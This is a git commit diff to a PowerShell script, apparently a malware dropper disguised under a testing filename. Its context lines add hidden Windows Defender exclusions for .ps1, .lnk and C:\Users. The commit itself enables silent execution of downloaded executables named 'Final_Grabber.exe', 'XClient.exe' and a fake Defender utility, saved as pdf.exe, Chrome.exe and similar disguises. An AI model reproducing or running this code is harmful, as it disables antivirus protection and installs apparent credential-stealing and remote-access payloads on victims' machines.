b90f02dd2c6d9b91edf185ad9d0059c0ce803f7c
rude90 <115774095+rude90@users.noreply.github.com>
2023-08-21 09:40:12 -0700

    Update py_script_testing.ps1

--- py_script_testing.ps1
+++ py_script_testing.ps1
@@ -3,17 +3,15 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
-# powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/test/raw/main/cyber-attack%20(1).png -o C:\Users\gift.png
-# powershell.exe -w Hidden C:\Users\gift.png
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\pdf.exe
-# powershell.exe -w Hidden C:\Users\pdf.exe
+powershell.exe -w Hidden C:\Users\pdf.exe
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/XClient.exe -o C:\Users\Chrome.exe
-# powershell.exe -w Hidden C:\Users\Chrome.exe
+powershell.exe -w Hidden C:\Users\Chrome.exe
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
-# powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
+powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
 
 
 
